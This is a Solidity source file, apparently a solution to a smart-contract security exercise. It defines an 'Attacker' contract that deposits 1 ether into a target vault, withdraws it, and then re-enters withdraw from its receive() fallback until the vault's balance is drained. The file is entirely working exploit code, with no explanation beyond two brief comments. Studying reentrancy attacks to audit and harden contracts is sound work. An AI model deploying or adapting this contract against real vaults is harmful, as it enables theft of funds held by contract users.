// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

interface IVault {
    function deposit(address to) payable external;
    function withdraw(uint amount) external;
}

contract Attacker {
    address vault;

    constructor (address _vault) {
        vault = _vault;
    }

    function attack() payable public {
        // First we need to deposit to be able to withdraw
        IVault(vault).deposit{value: 1 ether}(address(this));
        IVault(vault).withdraw(1 ether);
    }

    receive() external payable {
        // Reentrancy
        if (address(vault).balance > 1 ether) {
            IVault(vault).withdraw(1 ether);
        }
    }
}